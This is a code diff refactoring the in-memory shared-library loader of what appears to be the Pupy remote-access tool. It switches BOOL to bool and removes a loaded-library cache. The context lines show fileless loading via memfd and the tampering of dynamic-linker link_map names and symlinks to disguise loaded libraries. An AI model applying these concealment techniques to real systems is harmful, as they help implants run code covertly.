@@ -18,7 +18,6 @@
 #include <inttypes.h>
 #include <stddef.h>
 
-#include "list.h"
 #include "tmplibrary.h"
 #include "debug.h"
 
@@ -117,43 +116,24 @@ const char *gettemptpl() {
     return tmpdir;
 }
 
-typedef struct library {
-    const char *name;
-    void *base;
-} library_t;
-
-BOOL search_library(void *pState, void *pData) {
-    library_t *search = (library_t *) pState;
-    library_t *current = (library_t *) pData;
-
-    if (!strcmp(search->name, current->name)) {
-        search->base = current->base;
-        dprint("FOUND! %s = %p\n", search->name, search->base);
-
-        return TRUE;
-    }
-
-    return FALSE;
-}
-
 int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
 #if defined(Linux)
     int fd = pupy_memfd_create(path, path_size);
-    BOOL memfd = TRUE;
+    bool memfd = true;
 #elif defined(SunOS)
     char tmp[PATH_MAX] = {};
     snprintf(tmp, sizeof(tmp), "/tmp/%s", path);
     int fd = open(tmp, O_CREAT | O_RDWR, 0600);
     strncpy(path, tmp, path_size);
-    BOOL memfd = FALSE;
+    bool memfd = false;
 #else
     int fd = -1;
-    BOOL memfd = FALSE;
+    bool memfd = false;
 #endif
 
     if (fd < 0) {
         dprint("pupy_memfd_create() failed: %m\n");
-        memfd = FALSE;
+        memfd = false;
 
         const char *template = gettemptpl();
 
@@ -598,8 +578,8 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
         return handle;
     }
 
-    BOOL is_memfd = is_memfd_path(path);
-    BOOL linkmap_hacked = FALSE;
+    bool is_memfd = is_memfd_path(path);
+    bool linkmap_hacked = false;
 
     remap(path);
 
@@ -626,7 +606,7 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
                 linkmap->l_name = strdup(soname);
                 linkmap->l_libname->name = strdup(soname);
 
-                linkmap_hacked = TRUE;
+                linkmap_hacked = true;
             } else {
                 dprint("memdlopen - bad signature (lmid=%08x name1=%s name2=%s)\n",
                        linkmap->l_ns, linkmap->l_name, linkmap->l_libname->name);
@@ -652,7 +632,7 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
 
     /* Try to fallback to symlink hack */
 
-    BOOL is_memfd = is_memfd_path(path);
+    bool is_memfd = is_memfd_path(path);
     char fake_path[PATH_MAX] = {};
 
     const char *effective_path = path;
@@ -669,7 +649,7 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
 
         if (symlink(path, fake_path) == 0) {
             effective_path = fake_path;
-            is_memfd = FALSE;
+            is_memfd = false;
         } else {
             dprint("symlink error %s -> %s: %m\n", path, fake_path);
         }
@@ -778,21 +758,6 @@ void _pmparser_split_line(
 void *memdlopen(const char *soname, const char *buffer, size_t size, int flags) {
     dprint("memdlopen(\"%s\", %p, %ull)\n", soname, buffer, size);
 
-    static PLIST libraries = NULL;
-    if (!libraries) {
-        libraries = list_create();
-    }
-
-    library_t search = {
-        .name = soname,
-        .base = NULL,
-    };
-
-    if (list_enumerate(libraries, search_library, &search)) {
-        dprint("SO %s FOUND: %p\n", search.name, search.base);
-        return search.base;
-    }
-
     void *base = _dlopen(-1, soname, RTLD_NOLOAD, NULL);
     if (base) {
         dprint("Library \"%s\" loaded from OS\n", soname);
@@ -826,9 +791,5 @@ void *memdlopen(const char *soname, const char *buffer, size_t size, int flags) 
 
     dprint("Library %s loaded to %p\n", soname, base);
 
-    library_t *record = (library_t *) malloc(sizeof(library_t));
-    record->name = strdup(soname);
-    record->base = base;
-    list_add(libraries, record);
     return base;
 }
